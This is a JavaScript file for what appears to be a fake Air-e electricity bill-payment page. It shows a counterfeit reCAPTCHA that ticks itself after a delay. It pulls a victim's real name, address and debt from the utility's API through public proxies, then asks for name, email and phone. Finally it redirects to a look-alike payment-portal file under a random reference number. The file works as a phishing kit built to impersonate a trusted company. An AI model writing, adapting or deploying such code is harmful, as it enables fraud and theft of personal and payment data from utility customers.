// --- 1. LÓGICA DE MENÚ (SIDEBAR) ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (window.innerWidth <= 768) sidebar.classList.toggle('mobile-open');
    else sidebar.classList.toggle('hidden');
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. LÓGICA DE RECAPTCHA ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

if(checkboxContainer){
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        fakeCheckbox.style.display = 'none';
        spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none';
            checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. LÓGICA PRINCIPAL (CONSULTA RESILIENTE) ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if(btnPagar) {
    btnPagar.addEventListener('click', async () => {
        const nic = inputNic.value.trim();
        if(!nic) { alert("Por favor, ingrese el NIC."); return; }
        if(!isChecked) { alert("Por favor confirme que no es un robot."); return; }

        originalTitleStrip.style.display = 'none';
        whitePanel.innerHTML = `<div class="full-loader-container"><div class="big-loader"></div><p>Conectando con Air-e...</p></div>`;

        const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
        
        // Intentaremos con varios proxies diferentes en orden de fiabilidad para Render
        const proxyList = [
            `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}&_=${Date.now()}`,
            `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`,
            `https://thingproxy.freeboard.io/fetch/${targetUrl}`
        ];

        let finalData = null;

        for (let url of proxyList) {
            try {
                console.log("Intentando conexión via:", url);
                const response = await fetch(url);
                if (!response.ok) continue;

                const result = await response.json();
                
                // Normalizar la respuesta según el proxy usado
                let raw = result.contents ? result.contents : result;
                let parsed = (typeof raw === 'string') ? JSON.parse(raw) : raw;

                if (parsed && (parsed.ACCOUNTS || parsed.NAME)) {
                    finalData = parsed;
                    break; // Éxito, salimos del bucle
                }
            } catch (err) {
                console.error("Fallo un intento con el proxy:", err);
            }
        }

        if (!finalData) {
            alert("No se pudo obtener la información. Air-e está rechazando la conexión desde el servidor. Intenta de nuevo en unos minutos.");
            location.reload();
            return;
        }

        // --- RENDERIZADO DE RESULTADOS ---
        const info = finalData.ACCOUNTS || finalData;
        const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
        const nombreUsuario = finalData.NAME || info.NAME || "USUARIO AIR-E";
        
        let valorMesNum = 0;
        if (info.INVOICES && info.INVOICES.length > 0) {
            valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
        }

        whitePanel.innerHTML = `
        <div class="invoice-view">
            <div class="invoice-header"><h3>RESUMEN DE FACTURACIÓN</h3></div>
            <div style="text-align:center; padding:15px; background:#eef2f7; margin-bottom:20px; border-radius:8px; border: 1px solid #d1d9e6;">
                <strong style="display:block; color:#004a99; font-size:1.1em; text-transform:uppercase;">${nombreUsuario}</strong>
                <span style="color:#555; font-size:0.9em;">${info.COLLECTION_ADDRESS || 'Dirección de suministro'}</span>
            </div>
            <div class="invoice-form-grid">
                <div class="invoice-input-group"><label class="invoice-label">NIC / Contrato</label><input type="text" class="invoice-field" id="numId" value="${nic}" readonly></div>
                <div class="invoice-input-group"><label class="invoice-label">Nombres *</label><input type="text" class="invoice-field" id="nombres"></div>
                <div class="invoice-input-group"><label class="invoice-label">Apellidos *</label><input type="text" class="invoice-field" id="apellidos"></div>
                <div class="invoice-input-group"><label class="invoice-label">Correo electrónico *</label><input type="email" class="invoice-field" id="correo"></div>
                <div class="invoice-input-group"><label class="invoice-label">Celular *</label><input type="text" class="invoice-field" id="celular"></div>
            </div>
            <div class="payment-cards-grid">
                <div class="payment-card">
                    <div class="pay-card-title">Pago del Mes</div>
                    <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                    <button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button>
                </div>
                <div class="payment-card">
                    <div class="pay-card-title">Deuda Total</div>
                    <div class="pay-card-amount" style="color:#d32f2f;">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                    <button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button>
                </div>
            </div>
            <div class="invoice-footer">
                <div class="terms-check"><input type="checkbox" id="checkTerm" checked><span>Acepto el tratamiento de datos personales.</span></div>
                <button class="btn-cancel" onclick="location.reload()">VOLVER</button>
            </div>
        </div>`;
    });
}

// --- 4. REDIRECCIÓN A PASARELA ---
window.guardarYRedirigir = function(monto, tipo) {
    const fields = ['nombres', 'apellidos', 'correo', 'celular'];
    let valid = true;
    fields.forEach(f => { if(!document.getElementById(f).value) valid = false; });

    if(!valid || !document.getElementById('checkTerm').checked) {
        alert("Por favor completa todos los campos y acepta los términos.");
        return;
    }

    const datos = {
        nombre: document.getElementById('nombres').value + " " + document.getElementById('apellidos').value,
        nic: document.getElementById('numId').value,
        monto: parseInt(monto),
        ref: "AIR" + Math.floor(Math.random() * 900000 + 100000)
    };
    
    localStorage.setItem('datosFactura', JSON.stringify(datos));
    window.location.href = 'portalpagos.portalfacture.com.html';
};
